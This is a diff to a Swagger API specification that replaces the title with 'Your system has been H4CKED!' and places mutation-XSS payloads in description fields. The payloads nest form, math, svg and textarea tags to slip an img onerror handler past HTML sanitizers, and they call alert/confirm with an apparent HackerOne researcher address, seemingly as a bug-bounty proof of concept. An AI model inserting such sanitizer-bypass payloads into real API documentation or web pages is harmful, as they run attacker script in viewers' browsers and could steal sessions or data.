@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Your system has been H4CKED!
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=confirm('santiko1986@wearehackerone.com') src=`1`>"></form>
 
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(`santiko1986@wearehackerone.com`) src=`1`>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('santiko1986@wearehackerone.com') src=x>"></form>
 
           format: int64
           in: path
